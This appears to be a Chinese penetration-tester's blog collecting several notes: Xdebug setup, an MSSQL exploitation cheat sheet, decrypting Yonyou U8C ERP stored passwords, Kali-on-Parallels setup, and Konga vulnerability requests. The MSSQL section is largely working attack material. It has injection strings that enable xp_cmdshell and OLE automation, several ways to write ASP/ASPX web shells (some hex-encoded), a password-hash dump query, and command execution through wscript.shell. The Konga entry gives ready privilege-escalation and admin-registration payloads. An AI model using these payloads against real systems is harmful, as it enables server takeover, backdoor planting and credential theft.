entry.title: Xdebug3远程调式配置
entry.content:
Xdebug3远程调式配置

前言

不得不说宝塔搭配xdebug.remote_connect_back远程调试是真的香，xdebug3改了挺多选项在此记录一下。

更新参见：https://xdebug.org/docs/upgrade_guide

配置

根据php版本下载对应的xdebug扩展文件

把php -i或者phpinfo()内容放入https://xdebug.org/wizard 即可

Xdebug2

[XDebug]zend_extension=/www/server/php/71/lib/php/extensions/no-debug-non-zts-20160303/xdebug.soxdebug.remote_enable = onxdebug.remote_autostart = 1;xdebug.remote_host = 127.0.0.1;xdebug.remote_port = 9000xdebug.remote_connect_back = 1  #开启远程回连xdebug.remote_timeout=2000;xdebug.remote_log = /tmp/xdebug.logxdebug.idekey="PHPSTORM"

Xdebug3

[xdebug]zend_extension="E:/php/ext/php_xdebug-3.0.4-7.4-vc15-nts.dll"xdebug.mode=debug xdebug.start_with_request = yesxdebug.discover_client_host = onxdebug.client_port = 9000;xdebug.remote_host=127.0.0.1 xdebug.remote_handler=dbgp xdebug.idekey=PHPSTORM

entry.title: Mssql利用笔记
entry.content:
常用

host_name() @@servername @@version  db_name()查用户select name,sys.fn_varbintohexstr(password_hash) from sys.sql_logins and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--检测XP_DIRTREE读子目录：and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree') #dirtree 得使用指定列  创建表得用这个字段subdirectory execute 绕waf

IIS配置文件

默认iis目录 C:/Inetpub/wwwroot> C:\WINDOWS\system32\LogFiles\HTTPERR\httperr1.logwindows2003 C:\Windows/system32\inetsrv\metabase.xml  win2008/2012  C:\Windows\System32\inetsrv\config\applicationHost.config

读文件

mdut,sql tools等工具可以图形化列目录

一、使用xp_dirtree 列目录
depth设置为1，表示显示所以子目录
file设置为1，表示显示子目录的文件

execute master..xp_dirtree 'C:\',1,1;

二、使用openrowset读取文件

select * from OPENROWSET(BULK N'C:\Users\Public\a.asp', SINGLE_BLOB) rs

写文件

有杂质写文件之备份、差异备份 backup database

有杂质写文件之日志备份 backup log

有杂质写文件之sp_makewebtask

SP_OACreate无杂质写文件之调用ADODB.Stream对象

SP_OACreate写文件之调用scripting.filesystemobject对象

存储过程写文件 - sp_makewebtask

适用于SQL Server2008以前版本,2008被移除
sp_makewebtask存储过程 导shell (重建办法，先找台正常主机，sp_helptext ‘sp_makewebtask’,将他的SQL语句重新拷到目标机器执行一次就行了)

开启和关闭sp_makewebtask

exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE; 开启exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',0;RECONFIGURE; 关闭
;exec%20sp_makewebtask%20'D:\wwwroot\1.com\files\1.asp','%20select%20''<%25execute(request("a"))%25>''%20';-- exec sp_makewebtask 'c:\www\dd.asp','select''<%execute(request("a"))%>'' 'declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;

SP_OACreate写文件

#开启组件EXEC sp_configure 'show advanced options', 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure 'Ole Automation Procedures', 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure 'show advanced options', 0;

ADODB.Stream

scripting.filesystemobject

declare @o int, @f int, @t int, @ret intexec sp_oacreate 'scripting.filesystemobject', @o outexec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\cbd.asp', 1exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'

log备份 - backup log

有杂质体积小，public权限即可

drop table test_tmp;alter database XFData set RECOVERY FULL;create table  test_tmp  (a image);backup log XFData to disk = 'D:\WebRoot\asp.bak' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log XFData to disk = 'D:\webroot\123.asp'

差异备份写文件 - backup database

有杂质体积大，public权限即可

id=1;use test create table cmd(str image);insert into cmd(str) values ('<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request["\x61\x62\x63\x64"];eval(PAY,"\x75\x6E\x73\x61"+"\x66\x65");%>');--id=1;backup database test to disk='D:\web\css\22.aspx' with differential,format;--backup database 库名 to disk = 'c:\bak.bak';create table [dbo].[test] ([cmd] [image]); insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;

中文路径差异备份

1、将中文要备份到的路径转换为l6进制用下面的代码即可select CONVERT(VARBINARY(1000),'E:\迅雷下载\2.asp')/*字符串转16*/这个是将16进制转换为字符串SELECT CONVERT(VARCHAR,CONVERT(VARBINARY(50), 0x453a5ce8bf85e99bb7e4b88be8bdbd5c322e617370))/*16转字符串*/2、关键备份代码DECLARE @diskpath varchar(50)SET @diskpath=CONVERT(VARCHAR,CONVERT(VARBINARY(50), 0x453A5CD1B8C0D7CFC2D4D85C322E617370))backup database 这里是你的数据库名称 to disk=@disk 上面三行代码的第一行是定义一个变量 第二行是给变量赋值里面的16进制字符串0x453a5ce8bf85e99bb7e4b88be8bdbd5c322e617370为E:\迅雷下载\2.asp然后第三行执行备份

执行命令

xp_cmdshell

开启xp_cmdshell

EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXEC sp_configure 'show advanced options', 0; GO RECONFIGURE WITH OVERRIDE; 禁用advanced options

利用xp_cmdshell搜索

#第一步，创建临时表';CREATE TABLE tt_tmp (tmp1 varchar(8000));--  #第二步，用xp_cmdshell搜索并且把结果写入到表';insert into tt_tmp(tmp1) exec master..xp_cmdshell 'for /r c:\ %i in (Newslist*.aspx) do @echo %i ';-- #第三步，查看结果' and 1=(select top 1 tmp1 from tt_tmp)and 'a'='a  ';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\233.aspx';--

SP_OACreate

此方式执行是无回显的

开启和关闭SP_OACreate

exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE; 开启exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',0;RECONFIGURE; 关闭

wscript.shell

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\windows\system32\ping.exe"'declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >d:\\temp\\1.txt'

Shell.Application

declare @o intexec sp_oacreate 'Shell.Application', @o outexec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c whoami >e:\test.txt','c:\windows\system32','','1';

CLR

注册表

ref

SQL Server的CLR在渗透测试中的应用.pdf
https://www.cnblogs.com/linjincheng/p/9728853.html
https://www.jianshu.com/p/2d3d46f84cfd

entry.title: 用友N8C-ERP密码解密
entry.content:
配置文件

文件存放位置：L:\U8CERP\ierp\bin\prop.xml

看起来挺像正常的明文密码2333

密码解密

解密方法：L:\U8CERP\middleware\mw.jar -> decode()

文件太杂直接全局搜索nc.vo.framework.rsa;，发现藏在U8CERP\external\lib\basic.jar里

idea把这两个jar包导入，直接解密（用户密码也一样的加密）。

entry.title: Parallels安装kali折腾笔记
entry.content:
Parallels安装kali折腾笔记

安装版本：

kali-linux-2020.2-installer-amd64.iso
Parallels 16.0.1

Change Aliyun source

nano /etc/apt/sources.list 

#deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib

Update Soft

apt-get cleanapt-get updateapt-get upgrade -yapt-get dist-upgrade -yapt-get install dkms kpartx printer-driver-postscript-hp

Install Parallels Tools

sudo -seject /dev/cdrom 然后挂载toolsmkdir /media/ptmkdir /root/Desktop/ptmount /dev/cdrom /media/ptcp -r /media/pt/  /root/Desktop/ptcd /root/Desktop/pt/pt./install

无法安装linux-headers

接下来的错误都是要查看日志文件了cat /var/log/parallels-tools-install.log如果是无法安装linux-headers的话，就要手动安装。 先查看内核版本uname -a然后来这里http://http.kali.org/kali/pool/main/l/linux/下载三个对应内核版本的安装包手动安装国内使用aliyun下载更快 https://mirrors.aliyun.com/kali/pool/main/l/linux/linux-kbuild: linux-kbuild-xxxx_amd64.deblinux-header-common: linux-headers-xxxx-common_xxxx_amd64.deblinux-compiler-gcc: linux-compiler-gcc-xxx-amd64.deblinux-headers: linux-headers-xxxx_amd64.deb下载完成后，用dpkg命令安装deb包。dpkg -i xxxxx.deb

装完Tools后登陆白屏问题解决

关闭3D加速

参考

https://www.sqlsec.com/2019/12/pd.html

https://cloud.tencent.com/developer/article/1561336

https://forum.parallels.com/threads/how-to-install-the-parallels-tools-on-kali-linux.348342/

entry.title: Konga 漏洞
entry.content:
Konga 漏洞

简介

github：https://github.com/pantsel/konga

越权漏洞普通用户提升管理用户

利用条件：需账号一枚
links：
https://github.com/pantsel/konga/issues/695
https://github.com/pantsel/konga/issues/694

Payload

PUT /api/user/21 HTTP/1.1Host: test.konga.oa.comContent-Type: application/json;charset=utf-8 Content-Length: 226{    "admin": true,    "passports": {        "password": "1234@abcd!",        "protocol": "local"    },    "password_confirmation": "1234@abcd!",    "token": "eyJhbGciOiJIUzI1NiJ9.MjE.JSGF5Y5dU6zBaCkGaHQFjKlsTCXkf9_kfxiDSIMF6LI"}

前台注册管理员用户

利用条件：默认开放注册，直接发送请求即可
links: https://github.com/pantsel/konga/issues/555

Payload ：

POST /register HTTP/1.1Host: xx.qq.comConnection: closeAccept: application/json, text/plain, */*Sec-Fetch-Dest: emptyconnection-id: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Origin: https://xx.qq.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsReferer: https://xx.qq.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 106{"username":"admintest","email":"testa@qq.com","password":"qqAAwiqk1","password_confirmation":"qqAAwiqk1"}
